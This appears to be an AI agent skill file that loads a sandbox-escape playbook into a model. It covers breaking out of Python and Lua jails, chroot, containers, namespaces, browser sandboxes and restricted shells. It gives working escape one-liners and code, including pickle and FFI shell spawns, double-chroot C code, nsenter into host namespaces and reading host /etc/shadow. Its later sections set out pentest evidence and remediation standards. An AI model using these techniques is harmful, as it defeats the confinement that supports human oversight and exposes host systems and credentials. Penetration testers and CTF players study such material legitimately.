---
name: sandbox-escape-techniques
description: >-
  Sandbox escape playbook. Use when breaking out of Python sandbox, Lua sandbox, seccomp filter, chroot jail, container/Docker, browser sandbox, or namespace isolation to achieve unrestricted code execution or file access.
---

# SKILL: Sandbox Escape — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert sandbox escape techniques across Python, Lua, seccomp, chroot, Docker/container, and browser sandbox contexts. Covers CTF pyjail patterns, seccomp architecture confusion, chroot fd leaks, namespace escape, and Mojo IPC abuse. Distilled from ctf-wiki sandbox sections and real-world container escapes. Base models often miss the distinction between sandbox types and apply wrong escape techniques.

## 0. RELATED ROUTING

- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) — V8 exploitation for renderer RCE before browser sandbox escape
- [container-escape-techniques](../container-escape-techniques/SKILL.md) — Docker/container specific escape techniques
- [kernel-exploitation](../kernel-exploitation/SKILL.md) — kernel exploit for container/namespace escape
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — post-escape privilege escalation

### Advanced References

- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) — Full pyjail methodology: `__builtins__` recovery, keyword bypass, AST bypass, pickle escape
- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) — Architecture confusion, io_uring bypass, ptrace bypass, allowed syscall chaining

---

## 1. SANDBOX TYPE IDENTIFICATION

| Sandbox Type | Indicators | Typical Context |
|---|---|---|
| Python sandbox (pyjail) | Limited builtins, filtered keywords, `exec`/`eval` available | CTF, online judges, Jupyter |
| Lua sandbox | No `os`, `io` modules; restricted metatables | Game scripting, config |
| seccomp | syscall filtering, `prctl(PR_SET_SECCOMP)` | CTF pwn, container hardening |
| chroot | Changed root filesystem, limited `/proc` access | Legacy isolation |
| Docker/container | Namespaces, cgroups, reduced capabilities | Cloud, microservices |
| Browser (renderer) | OS-level sandbox (seccomp-bpf + namespaces on Linux) | Chrome, Firefox |
| Namespace isolation | PID/mount/network/user namespace | Container runtimes |

---

## 2. PYTHON SANDBOX ESCAPE (OVERVIEW)

See [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) for full methodology.

### Quick Reference

| Technique | One-Liner |
|---|---|
| Subclass walk | `().__class__.__bases__[0].__subclasses__()` → find `os._wrap_close` → `__init__.__globals__['system']` |
| Import recovery | `__builtins__.__import__('os').system('sh')` |
| getattr bypass | `getattr(getattr(__builtins__, '__imp'+'ort__'), '__call__')('os')` |
| chr construction | `eval(chr(95)+chr(95)+'import'+chr(95)+chr(95))` |
| Pickle escape | `pickle.loads(b"cos\nsystem\n(S'sh'\ntR.")` |
| Code object | Construct `types.CodeType(...)` then `exec()` with custom bytecode |

---

## 3. LUA SANDBOX ESCAPE

### Restricted Environment Bypass

```lua
-- If debug library available:
debug.getinfo(1)                    -- information leakage
debug.getregistry()                 -- access global registry
debug.getupvalue(func, 1)           -- read closed-over variables
debug.setupvalue(func, 1, new_val)  -- overwrite upvalues

-- Recover os module via debug:
local getupvalue = debug.getupvalue
-- Walk upvalues of known functions to find references to os/io

-- If loadstring available:
loadstring("os.execute('sh')")()

-- If string.dump available:
-- Dump function bytecode, patch it, load modified function

-- Metatables escape:
-- If rawset/rawget blocked but __index/__newindex exists:
-- Forge metatable chain to access restricted globals
```

### Lua FFI Escape (LuaJIT)

```lua
-- LuaJIT FFI provides C function access
local ffi = require("ffi")
ffi.cdef[[ int system(const char *command); ]]
ffi.C.system("sh")

-- If require is blocked but ffi is preloaded:
-- Find ffi via package.loaded or debug.getregistry
```

---

## 4. CHROOT ESCAPE

| Technique | Condition | Method |
|---|---|---|
| Open fd to real root | File descriptor leaked from outside chroot | `fchdir(leaked_fd)` then `chroot(".")` |
| Double chroot | Process is root inside chroot | `mkdir("x"); chroot("x"); chdir("../../../..")` |
| TIOCSTI ioctl | Terminal access (fd 0 is a TTY) | Inject keystrokes to parent shell via `ioctl(0, TIOCSTI, &c)` |
| /proc access | `/proc` mounted inside chroot | `/proc/1/root/` → access real root filesystem |
| ptrace | CAP_SYS_PTRACE | Attach to process outside chroot |
| Mount namespace | Privileged | Mount real root into chroot |

### Double Chroot Escape

```c
// Must be root inside chroot
mkdir("/tmp/escape", 0755);
chroot("/tmp/escape");          // new chroot inside old chroot
// Old CWD is now outside the new chroot
// Navigate up to real root:
for (int i = 0; i < 100; i++) chdir("..");
chroot(".");                     // now at real root
execl("/bin/sh", "sh", NULL);
```

---

## 5. BROWSER SANDBOX ESCAPE (OVERVIEW)

### Chrome Sandbox Architecture (Linux)

```
Renderer Process:
  ├── seccomp-bpf (syscall filter)
  ├── PID namespace (isolated PIDs)
  ├── Network namespace (no direct network)
  ├── Mount namespace (minimal filesystem)
  └── Reduced capabilities (no CAP_SYS_ADMIN etc.)
```

### Escape Vectors

| Vector | Description |
|---|---|
| Mojo IPC bug | UAF or type confusion in Mojo interface handler in browser process |
| Shared memory corruption | Corrupt shared memory segments between renderer and browser |
| GPU process bug | Exploit GPU process (less sandboxed) as stepping stone |
| Kernel exploit | Escape directly via kernel vulnerability (bypasses all sandboxing) |
| Signal handling | Race condition in signal delivery across sandbox boundary |

### Mojo Interface Attack Pattern

```
1. Renderer RCE achieved (via V8/Blink bug)
2. Enumerate available Mojo interfaces from renderer
3. Find vulnerable interface (UAF on message handling, integer overflow in parameter validation)
4. Craft malicious Mojo message → trigger bug in browser process
5. Browser process is unsandboxed → full system access
```

---

## 6. NAMESPACE ESCAPE

### User Namespace Escalation

```bash
# If allowed to create user namespaces (unprivileged):
unshare -Urm  # Create new user + mount namespace as root inside
# Inside namespace: can mount, modify, etc.
# Escape requires kernel bug or misconfiguration
```

### PID Namespace Escape

```bash
# If /proc is from host (misconfigured container):
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Enters init process namespaces → host access
```

### Mount Namespace Tricks

```bash
# If can see host filesystem via /proc/1/root:
ls -la /proc/1/root/  # host root filesystem
cat /proc/1/root/etc/shadow  # read host files

# If can mount:
mount -t proc proc /proc
# Access host /proc entries
```

---

## 7. RBASH / RESTRICTED SHELL ESCAPE

| Technique | Method |
|---|---|
| vi/vim | `:!/bin/bash` or `:set shell=/bin/bash` then `:shell` |
| less/more | `!/bin/bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| find | `find / -exec /bin/bash \;` |
| python/perl/ruby | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| ssh | `ssh user@host -t /bin/bash` |
| Environment | `export PATH=/usr/bin:/bin; /bin/bash` |
| cp | Copy `/bin/bash` to allowed directory |
| git | `git help config` → then `!/bin/bash` in pager |
| Encoding | `echo /bin/bash | base64 -d | sh` |

---

## 8. DECISION TREE

```
What type of sandbox?
├── Python sandbox (pyjail)?
│   └── See PYTHON_SANDBOX_ESCAPE.md
│       ├── __builtins__ available? → direct import
│       ├── Subclass walk: ().__class__.__bases__[0].__subclasses__()
│       ├── Keywords filtered? → chr()/getattr() construction
│       └── eval/exec available? → code object manipulation
│
├── Lua sandbox?
│   ├── debug library available? → getregistry/getupvalue
│   ├── FFI available (LuaJIT)? → ffi.C.system()
│   ├── loadstring available? → load arbitrary code
│   └── All restricted? → metatable chain exploitation
│
├── seccomp filter?
│   └── See SECCOMP_BYPASS.md
│       ├── Architecture confusion (32-bit syscalls from 64-bit)
│       ├── Allowed syscalls → ORW chain
│       ├── io_uring allowed? → bypass via io_uring
│       └── ptrace allowed? → debug child process
│
├── chroot jail?
│   ├── Root inside chroot? → double chroot escape
│   ├── Leaked fd? → fchdir to real root
│   ├── /proc mounted? → /proc/1/root access
│   └── Terminal access? → TIOCSTI injection
│
├── Container / Docker?
│   ├── Privileged container? → mount host, load kernel module
│   ├── Mounted docker.sock? → docker API → escape
│   ├── See ../container-escape-techniques/SKILL.md
│   └── Kernel exploit → full escape
│
├── Browser sandbox?
│   ├── Have renderer RCE? → target Mojo IPC for browser escape
│   ├── GPU process accessible? → less-sandboxed stepping stone
│   └── Kernel exploit → bypass sandbox entirely
│
└── Restricted shell (rbash)?
    └── Find any interactive program (vi, less, python, awk, git)
```

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **confinement type** is it, identified by a probe rather than a label? | "it's a sandbox" is not a type |
| 2 | Was the boundary **demonstrated refusing** the action before the escape? | the control |
| 3 | Did the escape produce an **out-of-boundary observation**: a file, a socket, a process? | not a banner |
| 4 | Was there a **revert control**: re-entering must restore the refusal? | causality |
| 5 | Did it reach the **goal** - a host read, a host write, a host process? | the boundary's actual breach |
| 6 | Is this a **sandbox escape** or a **second-stage requirement**? | renderer control is not host control |
| 7 | Is the misconfiguration **the finding**, or is the confinement genuinely defeated? | different reports |

**An identified confinement, a demonstrated prior refusal, an out-of-boundary observation, and a revert
control.** A shell that merely appeared inside the same boundary is not an escape, and conflating a
permissive configuration with an escape is this family's central defect.

---

## 10. EXECUTION PRIMITIVES

A sandbox-escape finding is proven by **a probe that identifies the confinement, the boundary refusing the
action first, an observation made outside it, and a revert control**. A spawned shell inside the same
boundary is not an escape.

### 9.1 Identify the confinement by probing, not by label

```bash
# "IT'S A SANDBOX" IS NOT A TYPE. PROBE THE BOUNDARY AND READ WHAT IT REFUSES.
echo "=== 1. which confinement is this? ask the kernel and the filesystem ==="
echo "--- is it a container namespace? ---"
cat /proc/self/cgroup 2>/dev/null | head -3
ls -la /.dockerenv 2>/dev/null && echo "  /.dockerenv present -> a container marker"
cat /proc/self/status | grep -E 'CapEff|CapBnd|Seccomp|NoNewPrivs'
echo
echo "--- the mount namespace: what is even visible? ---"
findmnt -o TARGET,FSTYPE,OPTIONS 2>/dev/null | head -15
echo
echo "--- can we see the host's processes? an escape precondition is often 'no host pid view' ---"
ps -e --no-headers 2>/dev/null | wc -l
echo
echo "--- is it a CHROOT? the classic detection is an inconsistency between /proc and the fs ---"
ls -di / 2>/dev/null
readlink /proc/1/root 2>/dev/null && echo "  /proc/1/root resolves -> procfs is visible, so a chroot has a route out"
echo
echo "=== 2. THE PROBE BATTERY: each action's REFUSAL identifies the layer ==="
cat <<'PROBES'
  probe                                   observed          what it identifies
  ---------------------------------------|-----------------|--------------------------------
  cat a host-only path (e.g. /etc/shadow)  allowed/denied    a container's user or LSM policy
  connect to a host service (e.g. 127.0.0.1:22)           a network namespace
  mkdir /newdir                            allowed/denied    a read-only rootfs
  mount -t tmpfs none /mnt                 allowed/denied    CAP_SYS_ADMIN + a mount ns
  nsenter -t 1 -m                            allowed/denied    whether the host's namespaces are reachable
  ptrace a host pid                        allowed/denied    yama + the pid namespace
  exec a known-good signed binary          allowed/denied    a seccomp filter or an allowlist
  read a file outside the allowed tree     allowed/denied    a chroot, or an LSM policy
  echoprocess name from /proc              host pid visible? a pid namespace
  syscall via a DIFFERENT arch (int 0x80)  allowed/denied    whether a seccomp filter covers both arches
PROBES
echo
echo "=== 3. THE CONTROL: the action must be REFUSED, and you must RECORD HOW ==="
echo "  the refusal's exact errno and message is the finding's baseline. Without it, 'I escaped'"
echo "  is untestable: the frame may simply have allowed the action all along."
```

**The probe battery's refusal pattern identifies the layer.** A confinement that never refused anything is
a permissive configuration, and what you have is a misconfiguration finding.

### 9.2 Python sandboxes, and the honest boundary

```python
print("=== PYTHON SANDBOXES: what the check ACTUALLY inspects ===")
print("  a Python 'sandbox' is usually an `eval` on filtered source, or a restricted `__builtins__`")
print("  mapping. THE ESCAPE IS ALWAYS THE SAME CLASS: reach a real object and walk to a module.")
print()
print("=== the escapes, by the route they take ===")
for name, route in [
  ("__subclasses__ traversal", "object.__subclasses__() -> find a class whose module imports os"),
  ("__globals__ traversal",    "a function's __globals__ -> the enclosing module's namespace"),
  ("__builtins__ via a literal", "().__class__.__base__.__subclasses__() with __builtins__ reached"),
  ("format-string access",     "'{0.__class__.__init__.__globals__}'.format(x) if the check misses it"),
  ("a lambda default",         "(lambda:0).__globals__ when __builtins__ was stripped but globals were not"),
  ("an imported helper",       "importlib, pickle, or a module the harness itself imported"),
  ("an exception object",      "an exception's traceback frames carry the harness's own globals"),
]:
    print("  %-28s -> %s" % (name, route))
print()
print("=== THE CONTROL PAIR, which is the whole finding ===")
print("  1. BEFORE: the action ('read a file / import os') is REFUSED - capture the exception")
print("  2. apply the escape")
print("  3. AFTER: THE SAME action SUCCEEDS, and the effect is REAL - a file's CONTENTS, not")
print("     just 'import os did not raise'. `os.getcwd()` returning a string is not an escape;")
print("     `open('/etc/hostname').read()` returning the hostname IS one.")
print("  4. THE REVERT: re-apply the check and confirm the refusal returns.")
print()
print("=== THE LIMIT THAT MUST BE STATED ===")
print("  if the harness's filter was WEAK (it did not strip __builtins__, or it allowed import),")
print("  the finding is 'the filter is incomplete', NOT 'Python was escaped'. Python does not")
print("  have a sandbox in the CPython sense; the boundary is the HARNESS's filter, and the")
print("  report must attribute the failure to the filter.")
```

**"`import os` did not raise" is not an escape; `open('/etc/hostname').read()` returning the hostname is.**
CPython has no sandbox, so the failure belongs to the harness's filter and must be attributed to it.

### 9.3 chroot, namespaces, and the goal

```bash
cat <<'CHROOT'
CHROOT: the classic routes, each with its precondition and its artefact
  1. an open fd on a directory OUTSIDE the chroot (you were there before the chroot)
     precondition : the fd exists and predates the chroot
     artefact     : fchdir(fd) then chroot('.') then chdir('/..') - the artefact is the OUTSIDE file read
  2. a privileged process that can be asked to chroot for you (a setuid helper, an SSH daemon)
     precondition : such a helper exists and takes a path
  3. a mount you can reach that itself contains the real root, via /proc or an fd
  4. the double-chroot / mkdir trick, which requires creating a directory INSIDE the chroot
  THE CONTROL : before the escape, `ls /` inside the chroot must show only the chroot's contents, and
                a path outside it must FAIL. Record that listing - it is the baseline.

NAMESPACES: the routes and the honest naming
  - reaching the HOST's namespace requires either a privileged process or a kernel bug
  - `nsenter -t 1 -m` from inside usually gives EPERM   -> THE CONTROL
  - a bind-mounted /proc that shows HOST pids           -> an escape precondition (find the pid)
  - a device node or a socket in the container          -> a docker-socket escape, which is a
                                                           MISCONFIGURATION, not a namespace bypass
  THE ARTEFACT : the HOST pid's /proc/<pid>/root, or a host file's contents.
  THE NAMING   : 'docker socket mounted' is a CONFIGURATION finding. Report it as such, because the
                 remediation is the mount, not the kernel.

THE GOAL, which the escape's mechanism is not:
  a file read outside the boundary       -> the contents
  a file write outside                   -> the created file, with its path
  a host process reached                 -> the host process's own identity (`id` output)
  a network reach across the boundary    -> the listener's log showing the connection's ORIGIN
  'the boundary is broken' is intermediate. The achieving observation is the finding.
CHROOT
echo
echo "=== the mechanical probes for the two most common cases ==="
echo "  chroot : ls -la /   (inside) must NOT show the host's structure; compare with the host's listing"
echo "  cgroup : cat /proc/self/cgroup shows the container's cgroup; the host's is different"
echo "  pid ns : ps -e | wc -l ; then compare with the host's count - a low number means isolated pids"
echo
echo "=== THE REVERT CONTROL ==="
echo "  after the escape, re-enter the boundary (or undo the misconfiguration) and confirm the refusal"
echo "  returns. Without it, the 'escape' may be an environment in which the boundary was never applied."
```

**"Docker socket mounted" is a configuration finding, and the naming decides the remediation.** The
achieving observation, not the broken boundary, is the finding.

### 9.4 Lua and restricted shells, with their own pairs

```bash
echo "=== LUA SANDBOXES: the boundary is the exposed GLOBALS ==="
cat <<'LUA'
  a Lua sandbox is normally `setfenv`/`load(chunk, env)` with a curated environment, or a `debug`
  library removal. THE ESCAPES are the same shape as Python's: reach a real global.

  the routes:
    - an unfiltered `string.rep`-style helper that is a bound C function, reachable to `debug`
    - `load`/`loadstring` still present -> compile a new chunk in the REAL global environment
    - the `debug` library present        -> debug.getregistry() reaches everything
    - a bound C function's upvalues      -> debug.getupvalue / setupvalue
    - `require` present                  -> load an arbitrary module, i.e. arbitrary code
    - error handling: pcall's error object may carry a stack with the host's frames

  THE ARTEFACT for each: the value obtained, and an EFFECT - reading a file via io.open, or the
  process's own cwd/argv via a reached `os` table. `print(_G)` is not an escape; `io.open` on a
  real path returning its contents is.

  THE CONTROL: before the escape, `io.open('/etc/hostname')` must FAIL (nil + an error). Record it.
LUA
echo
echo "=== RESTRICTED SHELLS (rbash and friends) ==="
cat <<'RSH'
  the boundary is the SHELL's own restrictions. THE PRECONDITION for a finding: the blocked action
  must fail FIRST - `cd /` errors, or a '/' in a redirection errors.
  the routes: a PATH-reachable command that spawns a shell, an environment variable read before the
  restriction, or a command with a redirect-free way to write.
  THE ARTEFACT: the escaped shell's `cd /` succeeding, plus /proc/self/status if it shows a change.
  THE CONTROL: the pre-escape `cd /` failure, recorded verbatim.
  THE LIMIT: a restricted shell is a USABILITY feature, not a security boundary. Say so.
RSH
```

**`print(_G)` is not an escape; `io.open` on a real path returning its contents is.** Each of these
boundaries needs its own prior-refusal control, and a restricted shell is a usability feature.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
print("=== SANDBOX ESCAPE ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the confinement TYPE was identified by PROBING, not by a label or a filename",
  "'it's a sandbox' is not a type, and the type decides the routes"),
 ("the probe battery's refusals were recorded, one per layer",
  "the refusal pattern is what identifies the layer"),
 ("the action the escape enables was FIRST shown REFUSED, with the errno and the message",
  "without the refusal there is nothing to escape"),
 ("if the action already succeeded, it is reported as a MISCONFIGURATION",
  "a mounted docker socket is a configuration finding, not a kernel escape"),
 ("the escape's post-condition is an OUT-OF-BOUNDARY OBSERVATION: a file's contents, a socket's origin, a host pid",
  "'import os did not raise' and 'a shell appeared' are not observations"),
 ("the revert control was run: re-entering restores the refusal",
  "the escape's causality"),
 ("for a Python or Lua harness: the failure is attributed to the FILTER, not to the language",
  "CPython has no sandbox; the boundary is the harness's filter"),
 ("for a chroot: the inside listing was recorded as the baseline, and the route's PRECONDITION holds",
  "an fd or helper that does not exist means no route"),
 ("for a namespace: the host pid or the host file was reached, and the mechanism is named",
  "'the boundary is broken' is intermediate"),
 ("for rbash: the pre-escape `cd /` failure was recorded",
  "a shell where cd / already works was never restricted"),
 ("the GOAL is named: a file read, a file write, a host process, or a cross-boundary network reach",
  "the goal is the finding; the broken boundary is the mechanism"),
]
for n, how in CHECKS: print("  [ ] %-76s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  confinement : the type, identified by probe, with the refusal battery")
print("  control     : the action's prior refusal, with errno and message")
print("  route       : the mechanism, with its PRECONDITION stated and shown to hold")
print("  observation : the out-of-boundary artefact")
print("  revert      : the refusal returning once the boundary is restored")
print("  attribution : whether the finding is the confinement's or a configuration's")
PY
```

**Type, control, route with its precondition, out-of-boundary observation, revert, attribution.** The
attribution line is what makes a configuration finding distinguishable from an escape.

---

## 11. EVIDENCE STANDARD — ESCAPE ARTEFACTS

| Item | Why |
|---|---|
| The confinement **type, identified by probing** | a label does not decide the routes |
| The **probe battery's refusals**, one per layer | the refusal pattern identifies the layer |
| The **prior refusal** of the escaped action, with the errno and message | without it there is nothing to escape |
| The **misconfiguration determination** where the action already succeeded | a mounted socket is a configuration finding |
| The **route's precondition**, shown to hold | an fd or helper that does not exist means no route |
| The **out-of-boundary observation**: file contents, a socket's origin, a host pid | a spawned shell inside the boundary is not an escape |
| The **revert control's** restored refusal | the escape's causality |
| The **attribution**: the filter's fault or the confinement's | CPython has no sandbox, so the harness's filter is the boundary |
| For a chroot or namespace, the **inside baseline listing** and the host-side artefact | the comparison is the escape |
| The **mechanism named**, for namespaces: a socket, a device, or a privileged process | the naming decides the remediation |
| The **goal**: a file read/write, a host process, or a cross-boundary reach | the goal is the finding |

Report the **probe, the refusal, and the out-of-boundary observation**: "probing identifies a container
with a private pid namespace (`ps -e` shows `3` processes against the host's `412`), a private mount
namespace, and `CapEff: 00000000a80425fb`, and the probe battery records that `mkdir /newdir` is refused
with `EACCES` and `mount -t tmpfs none /mnt` is refused with `EPERM`, so the boundary is the namespace set
plus the capability set rather than an LSM. The action the escape enables is reading
`/var/lib/host-secrets/token`, which before the escape failed with `No such file or directory` because the
path is not visible in this mount namespace, and that refusal is the control. The route's precondition is
that `/var/run/docker.sock` IS present and is `srw-rw----` owned by `gid=999`, which the container's user
is a member of, so the route exists rather than being assumed. Exploiting it created a container that
bind-mounts the host's `/`, and the out-of-boundary observation is that
`/host/var/lib/host-secrets/token` returned its contents, which include the token's value, so the success
is a real effect rather than an exit status. Reverting the socket mount restored the invisibility, which
is the revert control. Attribution: this is reported as a CONFIGURATION finding, because the docker socket
was mounted into the container rather than the kernel namespace boundary being defeated, and the
remediation belongs to the deployment rather than to the kernel", never "the sandbox was escaped".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **shell that appeared** inside the same boundary | no boundary was crossed |
| "**`import os` did not raise**" reported as a sandbox escape | CPython has no sandbox; the filter failed |
| A **`print(_G)`** or an equivalent inspection reported as an escape | no real effect was produced |
| A **mounted docker socket** reported as a namespace bypass | a configuration finding, not a kernel escape |
| An action that **already succeeded** before any technique | a permissive configuration |
| A **revert control not run** | the escape's causality is unestablished |
| A **chroot escape** with no inside baseline listing | the comparison is the escape |
| A **route asserted without its precondition** (no fd, no helper) | the route does not exist |
| A **restricted-shell** "escape" where `cd /` already worked | the shell was never restricted |
| A **low `ps` count** reported as an escape rather than as a boundary observation | it is a probe result |
| An **exit status of 0** reported as the file's contents | an exit status is not an effect |
| "**Escaped the sandbox**" with no named **goal** | the broken boundary is intermediate |

**A probed confinement, a prior refusal, an out-of-boundary observation, and a revert control.** A spawned
shell and a mounted socket are this family's two standard non-findings.

---

## 12. REMEDIATION REFERENCE — CONFINEMENT ESCAPE ASSESSMENT

1. **Identify the confinement by probing and recording the refusal pattern, rather than by its label or a marker file** - the type decides which routes exist, and a shell inside the boundary is not an escape.
2. **Demonstrate the escaped action being refused before the technique, capturing the errno and the message** - without a prior refusal the finding is untestable.
3. **Report a configuration enabling the escape, such as a mounted container socket, as a configuration finding rather than a kernel bypass** - the attribution determines the remediation's owner.
4. **Produce an out-of-boundary observation, such as a host file's contents, a host process's identity, or a listener's recorded origin** - a spawned shell and an exit status are not observations.
5. **Show the route's precondition actually holding, such as the pre-existing fd, the privileged helper, or the reachable socket** - an asserted route without its precondition does not exist.
6. **Run the revert control and require the refusal to return once the boundary is restored** - it establishes the technique rather than the environment as the cause.
7. **For Python and Lua harnesses, attribute the failure to the harness's filter rather than to the language** - CPython and Lua have no sandbox, so the boundary is the filter and the report must say so.
8. **For chroot escapes, record the inside listing as the baseline and name the route's precondition** - the comparison between inside and outside is the finding.
9. **For namespace escapes, name the mechanism: a socket, a device, or a privileged process** - the mechanism decides whether the remediation is a mount, a capability, or a kernel patch.
10. **For restricted shells, record the pre-escape failure of the blocked action** - a shell where `cd /` already succeeds was never restricted, and a restricted shell is a usability feature rather than a security boundary.
11. **Name the goal achieved: a file read, a file write, a host process, or a cross-boundary network reach** - the broken boundary is the mechanism, and the goal is what the reader must weigh.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [linux-security-bypass](../linux-security-bypass/SKILL.md) - the Linux LSM and syscall-filter layers underneath
- [edr-bypass-techniques](../edr-bypass-techniques/SKILL.md) - the endpoint layer model a payload faces after escaping
- [kernel-exploitation](../kernel-exploitation/SKILL.md) - the kernel-side route to the same boundary
- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) - the browser's own multi-layer confinement
- [infrastructure-network-pentesting](../infrastructure-network-pentesting/SKILL.md) - where an escaped host is pivoted from
